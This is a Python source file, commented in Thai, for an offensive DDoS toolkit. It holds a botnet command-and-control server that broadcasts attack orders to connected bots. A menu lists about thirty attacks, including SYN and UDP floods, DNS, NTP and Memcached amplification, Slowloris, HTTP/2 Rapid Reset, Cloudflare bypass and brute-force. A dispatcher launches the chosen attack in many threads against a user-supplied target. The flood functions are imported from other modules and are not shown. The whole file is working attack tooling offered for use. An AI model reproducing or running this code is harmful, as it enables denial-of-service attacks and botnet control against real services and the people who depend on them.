import threading  # นำเข้าโมดูล threading สำหรับการทำงานแบบมัลติเธรด
import socket  # นำเข้าโมดูล socket สำหรับการเชื่อมต่อเครือข่าย
import asyncio  # นำเข้าโมดูล asyncio สำหรับการทำงานแบบ async
import os  # นำเข้าโมดูล os สำหรับจัดการไฟล์และระบบปฏิบัติการ
import time  # นำเข้าโมดูล time สำหรับจัดการเวลา
from src.config import CONFIG  # นำเข้าการตั้งค่าจาก config
from src.utils import load_file_lines, add_system_log  # นำเข้าฟังก์ชันโหลดไฟล์
from src.security import (  # นำเข้าฟังก์ชันความปลอดภัย
    check_system_resources, increment_thread_counter, decrement_thread_counter,
    validate_target, ResourceMonitor
)
from src.attacks import (  # นำเข้าฟังก์ชันโจมตีต่างๆ
    http_flood, async_http_flood, syn_flood, udp_flood,  # ฟังก์ชันโจมตี Layer 4 และ 7
    slowloris_attack, ntp_amplification, cloudflare_bypass_flood,  # ฟังก์ชันโจมตีพิเศษ
    memcached_amplification, ssdp_amplification, dns_amplification,  # ฟังก์ชันโจมตี Amplification
    rudy_attack, hoic_attack,  # ฟังก์ชันโจมตีพิเศษอื่นๆ
    http2_rapid_reset, apache_killer, nginx_range_dos,  # ฟังก์ชันโจมตี Application Layer Exploits
    port_scanner
)


# Botnet C2 Server  # สำหรับคลาส
class BotnetC2:  # คลาสสำหรับเซิร์ฟเวอร์ Command and Control
    def __init__(self, host='0.0.0.0', port=6667):  # เมธอดเริ่มต้นของคลาส
        self.host = host  # เก็บค่า host
        self.port = port  # เก็บค่า port
        self.bots = {}  # พจนานุกรมเก็บข้อมูล bots
        self.commands = []  # ลิสต์เก็บคำสั่ง
        self.logs = [] # Store events for dashboard
        self.running = False

    def log(self, message):
        """Add message to logs"""
        add_system_log(f"[bold yellow]C2:[/] {message}")

    def broadcast(self, message):
        """Send command to all connected bots"""
        dead_ids = []
        for bot_id, client in self.bots.items():
            try:
                client.send(message.encode() + b"\n")
            except:
                dead_ids.append(bot_id)
        
        for dead_id in dead_ids:
            if dead_id in self.bots:
                del self.bots[dead_id]
        
        if dead_ids:
            self.log(f"Removed {len(dead_ids)} disconnected bots")

    def start_server(self):  # เมธอดเริ่มเซิร์ฟเวอร์
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # สร้าง TCP socket
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # อนุญาตให้ใช้ address ซ้ำ
        server.bind((self.host, self.port))  # ผูก socket กับ host และ port
        server.listen(100)  # ฟังการเชื่อมต่อ (สูงสุด 100)
        self.running = True
        self.log(f"🟢 C2 server started on {self.port}")

        while self.running:  # วนลูปไม่สิ้นสุด
            try:  # ลองรับการเชื่อมต่อ
                server.settimeout(1.0) # Non-blocking accept
                try:
                    client, addr = server.accept()
                except socket.timeout:
                    continue
                
                bot_id = f"{addr[0]}:{addr[1]}"  # สร้าง ID สำหรับ bot
                self.bots[bot_id] = client  # เพิ่ม bot เข้าไปในพจนานุกรม
                self.log(f"🤖 Bot connected: {bot_id}")
                threading.Thread(target=self.handle_bot, args=(client, bot_id), daemon=True).start()  # เริ่ม thread จัดการ bot
            except Exception as e:
                if self.running:
                    self.log(f"❌ Server Error: {e}")
                break

        server.close()
        self.running = False
        self.log("🔴 C2 server stopped")

    def command_loop(self):
        """Interactive command input loop"""
        while True:
            try:
                cmd = input("C2> ").strip()
                if cmd.lower() in ['quit', 'exit', 'q']:
                    print("🛑 Stopping C2 server...")
                    os._exit(0)
                elif cmd.lower() == 'list':
                    self.list_bots()
                elif cmd.lower() == 'help':
                    self.show_help()
                elif cmd:
                    self.send_command(cmd)
                time.sleep(0.1)
            except (EOFError, KeyboardInterrupt):
                break

    def list_bots(self):
        """List all connected bots"""
        if not self.bots:
            print("📭 No bots connected")
        else:
            print(f"🤖 Connected bots ({len(self.bots)}):")
            for bot_id in self.bots.keys():
                print(f"  • {bot_id}")

    def show_help(self):
        """Show available commands"""
        print("Available commands:")
        print("  info                             - Get system information from all bots")
        print("  ping                             - Test connectivity with all bots")
        print("  attack <target> <port> <dur> <met> - Command bots to start an attack")
        print("                                     methods: http, udp, syn")
        print("  echo                             - Echo test from all bots")
        print("  uptime                           - Get uptime from all bots")
        print("  whoami                           - Get user info from all bots")
        print("  list                             - List all connected bots")
        print("  help                             - Show this help")
        print("  quit                             - Stop C2 server")

    def handle_bot(self, client, bot_id):  # เมธอดจัดการ bot แต่ละตัว
        while self.running:  # วนลูปไม่สิ้นสุด
            try:  # ลองรับข้อมูล
                client.settimeout(1.0)
                try:
                    data = client.recv(1024)
                except socket.timeout:
                    continue

                if not data:  # ถ้าไม่มีข้อมูล
                    break  # ออกจากลูป
                command = data.decode().strip()  # แปลงข้อมูลเป็น string และตัดช่องว่าง
                if command.startswith("RESULT:"):  # ถ้าเป็นผลลัพธ์
                    self.log(f"📩 [{bot_id}] {command[7:]}")
                elif command == "PING":  # ถ้าเป็น ping
                    client.send(b"PONG\n")  # ตอบกลับ pong
            except:  # จัดการข้อผิดพลาด
                break  # ออกจากลูป
        if bot_id in self.bots:  # ถ้า bot ยังอยู่ในลิสต์
            del self.bots[bot_id]  # ลบ bot ออกจากลิสต์
        client.close()  # ปิดการเชื่อมต่อ client
        self.log(f"🔌 Bot disconnected: {bot_id}")

    def send_command(self, command):  # เมธอดส่งคำสั่งไปยัง bots
        for bot_id, client in self.bots.items():  # วนลูปทุกรายการใน bots
            try:  # ลองส่งคำสั่ง
                client.send(f"{command}\n".encode())  # ส่งคำสั่งที่เข้ารหัสเป็น bytes
            except:  # ถ้าส่งไม่ได้
                pass # Bot will be cleaned up in handle_bot or next loop


class Menu:  # คลาสสำหรับระบบเมนู
    """Menu system for the DDoS tool"""  # ของคลาส

    ATTACKS = {  # พจนานุกรมเก็บข้อมูลการโจมตีต่างๆ
        "1": {"name": "Layer 7 HTTP Flood (Basic)", "func": "http_flood", "needs_root": False},  # การโจมตี HTTP พื้นฐาน
        "2": {"name": "Layer 7 Async HTTP Flood (Advanced + Proxies)", "func": "async_http_flood", "needs_root": False},  # การโจมตี HTTP แบบ async
        "3": {"name": "Layer 4 SYN Flood", "func": "syn_flood", "needs_root": True},  # การโจมตี SYN Flood
        "4": {"name": "Layer 4 UDP Flood", "func": "udp_flood", "needs_root": True},  # การโจมตี UDP Flood
        "5": {"name": "Layer 7 Slowloris Attack", "func": "slowloris_attack", "needs_root": False},  # การโจมตี Slowloris
        "6": {"name": "NTP Amplification Attack", "func": "ntp_amplification", "needs_root": True},  # การโจมตี NTP Amplification
        "7": {"name": "Botnet C2 Server", "func": "botnet_c2", "needs_root": False},  # เซิร์ฟเวอร์ C2
        "8": {"name": "Cloudflare Bypass Flood", "func": "cloudflare_bypass_flood", "needs_root": False},  # การโจมตี Cloudflare Bypass
        "9": {"name": "Memcached Amplification Attack", "func": "memcached_amplification", "needs_root": True},  # การโจมตี Memcached Amplification
        "10": {"name": "SSDP Amplification Attack", "func": "ssdp_amplification", "needs_root": True},  # การโจมตี SSDP Amplification
        "11": {"name": "DNS Amplification Attack", "func": "dns_amplification", "needs_root": True},  # การโจมตี DNS Amplification
        "12": {"name": "RUDY (R U Dead Yet?) Attack", "func": "rudy_attack", "needs_root": False},  # การโจมตี RUDY
        "13": {"name": "HOIC (High Orbit Ion Cannon) Attack", "func": "hoic_attack", "needs_root": False},  # การโจมตี HOIC
        "14": {"name": "HTTP/2 Rapid Reset (CVE-2023-44487)", "func": "http2_rapid_reset", "needs_root": False},  # การโจมตี HTTP/2 Rapid Reset
        "15": {"name": "Apache Range Header DoS", "func": "apache_killer", "needs_root": False},  # การโจมตี Apache Killer
        "16": {"name": "Nginx Range Header DoS", "func": "nginx_range_dos", "needs_root": False},  # การโจมตี Nginx Range DoS
        "17": {"name": "Port Scanner", "func": "port_scanner", "needs_root": False},  # เครื่องมือสแกนพอร์ต
        "18": {"name": "Launch Local Bot Client", "func": "launch_bot", "needs_root": False}, # เปิดบอทเชื่อมต่อ C2
        "20": {"name": "Local Network Recon (IP/Port/Status)", "func": "network_scanner", "needs_root": False},
        "21": {"name": "IP-Tracker (Deep OSINT Intel)", "func": "ip_tracker", "needs_root": False},
        "22": {"name": "AI-Adaptive Smart Flood", "func": "adaptive_flood", "needs_root": False},
        "23": {"name": "Vulnerability Scout", "func": "vulnerability_scout", "needs_root": False},
        "24": {"name": "Brute-Force Suite", "func": "brute_force_suite", "needs_root": False},
        "25": {"name": "Domain OSINT Hunter", "func": "domain_osint", "needs_root": False},
        "26": {"name": "Proxy Auto-Pilot", "func": "proxy_autopilot", "needs_root": False},
        "27": {"name": "WiFi Ghost Recon", "func": "wifi_ghost", "needs_root": True},
        "28": {"name": "Packet Insight Sniffer", "func": "packet_insight", "needs_root": True},
        "29": {"name": "Payload Laboratory", "func": "payload_lab", "needs_root": False},
        "30": {"name": "Identity Cloak Mode", "func": "identity_cloak", "needs_root": True}
    }

    @staticmethod  # decorator สำหรับเมธอด static
    def display():  # เมธอดแสดงเมนู
        """Display the attack menu"""  # ของเมธอด
        print("\nSelect Attack Type:")  # แสดงข้อความเลือกประเภทการโจมตี
        for key, attack in Menu.ATTACKS.items():  # วนลูปแสดงรายการการโจมตี
            print(f"{key}. {attack['name']}")  # แสดงตัวเลือก
        return input("Enter choice: ").strip()  # รับค่าจากผู้ใช้และตัดช่องว่าง

    @staticmethod  # decorator สำหรับเมธอด static
    def get_attack_params(choice):  # เมธอดรับพารามิเตอร์การโจมตี
        """Get attack parameters based on choice"""  # ของเมธอด
        if choice == "7":  # ถ้าเลือก C2 server
            # Special case for C2 server  # 
            try:  # ลองแปลงพอร์ตเป็นตัวเลข
                c2_port_input = input("C2 Port (default 6667): ").strip()  # รับพอร์ต C2
                c2_port = int(c2_port_input) if c2_port_input else CONFIG['C2_DEFAULT_PORT']  # แปลงเป็น int หรือใช้ค่าเริ่มต้น
                if not (1 <= c2_port <= 65535):  # ตรวจสอบช่วงพอร์ต
                    raise ValueError("Port must be between 1 and 65535")  # ข้อผิดพลาดถ้าพอร์ตไม่ถูกต้อง
            except ValueError as e:  # จัดการข้อผิดพลาดการแปลง
                print(f"Invalid port: {e}")  # แสดงข้อความผิดพลาด
                return None  # คืนค่า None
            return {"c2_port": c2_port}  # คืนค่าพารามิเตอร์

        # Standard parameters with validation  # สำหรับพารามิเตอร์ปกติพร้อมการตรวจสอบ
        target = input("Target (IP or URL): ").strip()  # รับเป้าหมาย
        if not target:  # ถ้าเป้าหมายว่าง
            print("Target cannot be empty!")  # แสดงข้อความผิดพลาด
            return None  # คืนค่า None

        if not validate_target(target):  # ถ้าเป้าหมายไม่ถูกต้อง
            print("Invalid target format! Please enter a valid IP or URL.")  # แสดงข้อความเป้าหมายไม่ถูกต้อง
            return None  # คืนค่า None

        try:  # ลองแปลงพารามิเตอร์เป็นตัวเลข
            port_input = input(f"Port (default {CONFIG['DEFAULT_PORT']}): ").strip()  # รับพอร์ต
            port = int(port_input) if port_input else CONFIG['DEFAULT_PORT']  # แปลงเป็น int หรือใช้ค่าเริ่มต้น
            if not (1 <= port <= 65535):  # ตรวจสอบช่วงพอร์ต
                raise ValueError("Port must be between 1 and 65535")  # ข้อผิดพลาดถ้าพอร์ตไม่ถูกต้อง

            threads_input = input(f"Threads (default {CONFIG['DEFAULT_THREADS']}, max 1000): ").strip()  # รับจำนวนเธรด
            threads = int(threads_input) if threads_input else CONFIG['DEFAULT_THREADS']  # แปลงเป็น int หรือใช้ค่าเริ่มต้น
            if not (1 <= threads <= 1000):  # ตรวจสอบช่วงเธรด
                raise ValueError("Threads must be between 1 and 1000")  # ข้อผิดพลาดถ้าเธรดไม่ถูกต้อง

            duration_input = input(f"Duration (seconds, default {CONFIG['DEFAULT_DURATION']}, max 3600): ").strip()  # รับระยะเวลา
            duration = int(duration_input) if duration_input else CONFIG['DEFAULT_DURATION']  # แปลงเป็น int หรือใช้ค่าเริ่มต้น
            if not (1 <= duration <= 3600):  # ตรวจสอบช่วงระยะเวลา
                raise ValueError("Duration must be between 1 and 3600 seconds")  # ข้อผิดพลาดถ้าระยะเวลาไม่ถูกต้อง

        except ValueError as e:  # จัดการข้อผิดพลาดการแปลง
            print(f"Invalid input: {e}")  # แสดงข้อความผิดพลาด
            return None  # คืนค่า None

        proxy_file = input(f"Proxy file ({CONFIG['PROXY_FILE']}) or leave empty: ").strip()  # รับไฟล์พร็อกซี

        # Validate proxy file path  # สำหรับตรวจสอบไฟล์พร็อกซี
        proxies = []  # เริ่มต้นลิสต์พร็อกซีว่าง
        if proxy_file:  # ถ้ามีไฟล์พร็อกซี
            import os  # นำเข้าโมดูล os
            if not os.path.isfile(proxy_file):  # ถ้าไฟล์ไม่พบ
                print(f"Proxy file not found: {proxy_file}")  # แสดงข้อความไฟล์ไม่พบ
            elif os.path.getsize(proxy_file) > 1024 * 1024:  # ถ้าไฟล์ใหญ่กว่า 1MB
                print("Proxy file too large (max 1MB)")  # แสดงข้อความไฟล์ใหญ่เกิน
            else:  # ถ้าไฟล์ถูกต้อง
                proxies = load_file_lines(proxy_file)  # โหลดไฟล์พร็อกซี

        return {  # คืนค่าพจนานุกรมที่มีพารามิเตอร์
            "target": target,  # เป้าหมาย
            "port": port,  # พอร์ต
            "threads": threads,  # จำนวนเธรด
            "duration": duration,  # ระยะเวลา
            "proxies": proxies  # รายการพร็อกซี
        }


class AttackDispatcher:  # คลาสสำหรับจัดการการโจมตี
    """Handles attack execution"""  # ของคลาส

    @staticmethod  # decorator สำหรับเมธอด static
    def execute(choice, params, monitor=None):  # เมธอดดำเนินการโจมตี
        """Execute the selected attack"""  # ของเมธอด
        attack_info = Menu.ATTACKS.get(choice)  # รับข้อมูลการโจมตีจากเมนู
        if not attack_info:  # ถ้าไม่พบข้อมูล
            print("Invalid choice!")  # แสดงข้อความเลือกไม่ถูกต้อง
            return  # ออกจากฟังก์ชัน

        # Check root privileges if needed  # 
        from utils import check_root_privileges  # นำเข้าฟังก์ชันตรวจสอบสิทธิ์
        if attack_info["needs_root"] and not check_root_privileges():  # ถ้าต้องการ root และไม่มีสิทธิ์
            print(f"{attack_info['name']} requires root privileges!")  # แสดงข้อความต้องการสิทธิ์ root
            return  # ออกจากฟังก์ชัน

        # Validate parameters  # สำหรับตรวจสอบพารามิเตอร์
        if params is None:  # ถ้าพารามิเตอร์เป็น None
            print("Invalid parameters provided!")  # แสดงข้อความพารามิเตอร์ไม่ถูกต้อง
            return  # ออกจากฟังก์ชัน

        # Special cases  # สำหรับกรณีพิเศษ
        if choice == "7":  # ถ้าเลือก C2 server
            c2 = BotnetC2(port=params["c2_port"])  # สร้างออบเจ็กต์ C2
            threading.Thread(target=c2.start_server, daemon=True).start()  # เริ่มเซิร์ฟเวอร์ในพื้นหลัง
            return c2  # Return the instance instead of blocking

        if choice == "18": # Launch Local Bot
            from bot import FullBot
            bot = FullBot(params['c2_host'], params['c2_port'])
            threading.Thread(target=bot.run, kwargs={'interactive': False}, daemon=True).start()
            return bot

        # Prepare target URL/IP  # สำหรับเตรียมเป้าหมาย
        target = params["target"]  # รับค่าเป้าหมาย
        port = params.get("port", 0)  # รับค่าพอร์ต (ถ้าไม่มีให้เป็น 0)
        duration = params["duration"]  # รับค่าระยะเวลา
        threads = params["threads"]  # รับค่าจำนวนเธรด
        proxies = params["proxies"]  # รับค่ารายการพร็อกซี
        max_requests = params.get("max_requests", 0)  # รับค่าจำนวนการยิงสูงสุด

        # Execute attack  # สำหรับดำเนินการโจมตี
        add_system_log(f"[bold red]LAUNCHING:[/] {attack_info['name']} against {target}")
        
        if choice == "1":  # ถ้าเลือก HTTP Flood พื้นฐาน
            url = target if target.startswith("http") else f"http://{target}"  # เตรียม URL
            for _ in range(threads):  # วนลูปตามจำนวนเธรด
                increment_thread_counter()  # เพิ่มตัวนับเธรด
                threading.Thread(target=http_flood, args=(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False)), daemon=True).start()  # เริ่มเธรดโจมตี

        elif choice == "2":  # ถ้าเลือก Async HTTP Flood
            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
            asyncio.run(async_http_flood(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False)))  # รัน async function

        elif choice == "3":  # ถ้าเลือก SYN Flood
            for _ in range(threads):  # วนลูปตามจำนวนเธรด
                increment_thread_counter()  # เพิ่มตัวนับเธรด
                threading.Thread(target=syn_flood, args=(target, port, duration, monitor, max_requests), daemon=True).start()  # เริ่มเธรดโจมตี

        elif choice == "4":  # ถ้าเลือก UDP Flood
            for _ in range(threads):  # วนลูปตามจำนวนเธรด
                increment_thread_counter()  # เพิ่มตัวนับเธรด
                threading.Thread(target=udp_flood, args=(target, port, duration, monitor, max_requests), daemon=True).start()  # เริ่มเธรดโจมตี

        elif choice == "5":  # ถ้าเลือก Slowloris Attack
            slowloris_attack(target, port, duration, threads)  # เรียกฟังก์ชันโจมตี

        elif choice == "6":  # ถ้าเลือก NTP Amplification
            ntp_amplification(target, port, duration, monitor, max_requests)  # เรียกฟังก์ชันโจมตี

        elif choice == "8":  # ถ้าเลือก Cloudflare Bypass
            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
            cloudflare_bypass_flood(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False))  # เรียกฟังก์ชันโจมตี

        elif choice == "9":  # ถ้าเลือก Memcached Amplification
            memcached_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี

        elif choice == "10":  # ถ้าเลือก SSDP Amplification
            ssdp_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี

        elif choice == "11":  # ถ้าเลือก DNS Amplification
            dns_amplification(target, port, duration)  # เรียกฟังก์ชันโจมตี

        elif choice == "12":  # ถ้าเลือก RUDY Attack
            rudy_attack(target, port, duration)  # เรียกฟังก์ชันโจมตี

        elif choice == "13":  # ถ้าเลือก HOIC Attack
            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
            hoic_attack(url, duration, proxies)  # เรียกฟังก์ชันโจมตี

        elif choice == "14":  # ถ้าเลือก HTTP/2 Rapid Reset
            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
            http2_rapid_reset(url, duration, proxies)  # เรียกฟังก์ชันโจมตี

        elif choice == "15":  # ถ้าเลือก Apache Killer
            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
            apache_killer(url, duration, proxies)  # เรียกฟังก์ชันโจมตี

        elif choice == "16":  # ถ้าเลือก Nginx Range DoS
            url = target if target.startswith("http") else f"https://{target}"  # เตรียม URL
            nginx_range_dos(url, duration, proxies)  # เรียกฟังก์ชันโจมตี

        elif choice == "17":  # Port Scanner
            port_scanner(target, params["ports"], threads)

        elif choice == "20":  # Local Network Recon
            from attacks import network_scanner
            network_scanner(threads, params.get("subnet"))

        elif choice == "21": # IP Tracker
            from utils import ip_tracker
            ip_tracker(params.get("ip"))

        elif choice == "22": # AI-Adaptive Smart Flood
            from attacks import adaptive_flood
            url = target if target.startswith("http") else f"http://{target}"
            for _ in range(threads):
                increment_thread_counter()
                threading.Thread(target=adaptive_flood, args=(url, duration, proxies, monitor), daemon=True).start()

        elif choice == "23": # Vulnerability Scout
            from attacks import vulnerability_scout
            vulnerability_scout(target)

        elif choice == "24": # Brute-Force Suite
            from attacks import brute_force_suite
            brute_force_suite(target, params.get("service"), params.get("username"))

        elif choice == "25": # Domain OSINT
            from attacks import domain_osint
            domain_osint(target)

        elif choice == "26": # Proxy Autopilot
            from attacks import proxy_autopilot
            proxy_autopilot()

        elif choice == "27": # WiFi Ghost
            from attacks import wifi_ghost
            wifi_ghost()

        elif choice == "28": # Packet Insight
            from attacks import packet_insight
            packet_insight(params.get("duration", 10))

        elif choice == "29": # Payload Lab
            from attacks import payload_lab
            payload_lab()

        elif choice == "30": # Identity Cloak
            from attacks import identity_cloak
            identity_cloak()
